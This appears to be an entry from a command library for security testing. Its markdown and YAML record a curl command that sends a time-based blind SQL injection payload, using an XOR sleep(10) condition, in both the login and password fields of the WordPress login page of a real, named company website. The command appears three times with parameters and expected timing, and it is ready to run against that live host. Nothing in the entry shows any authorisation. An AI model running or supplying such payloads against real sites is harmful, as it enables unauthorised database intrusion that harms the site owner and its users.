---
id: cmd-curl-capture-10-001
data: >-
  curl -v -X POST https://www.acronis.cz/wp-login.php -d
  "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&wp-submit=Log+In&g-recaptcha-response=dummy"
  -w "%{time_total}s"
tags:
  - sqli
  - capture
type: command
output: Verbose output with 12000ms delay.
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.519Z'
verified: false
validated: true
submitted: true
---
# curl-capture-sleep-10

## Command

```bash
curl -v -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&wp-submit=Log+In&g-recaptcha-response=dummy" -w "%{time_total}s"
```

## Description

Captures full request with 10s sleep in both parameters for analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose headers | Yes |
| `-d` | Dual payload + CAPTCHA dummy | Yes |

## Examples

### Basic Usage

```bash
curl -v -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&pwd=0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&wp-submit=Log+In&g-recaptcha-response=dummy" -w "%{time_total}s"
```

## Expected Output

Headers, body, and ~12s time.

## Related

- [[Related Procedure: Capture and Analyze Full HTTP Request for SQLi]]
